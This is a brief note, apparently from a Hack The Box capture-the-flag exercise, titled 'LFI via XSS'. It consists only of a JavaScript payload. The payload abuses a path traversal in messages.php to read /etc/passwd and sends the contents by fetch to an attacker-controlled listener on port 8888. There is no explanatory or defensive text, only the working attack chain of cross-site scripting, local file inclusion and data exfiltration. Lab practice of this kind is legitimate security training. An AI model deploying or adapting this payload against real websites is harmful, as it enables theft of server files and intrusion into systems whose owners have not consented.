# LFI via XSS

\
fetch("http://alert.htb/messages.php?file=../../../../etc/passwd")\
&#x20; .then(response => response.text())\
&#x20; .then(data => {\
&#x20;   fetch("http://10.10.xx.xx:8888/?file\_content=" + encodeURIComponent(data));\
&#x20; });
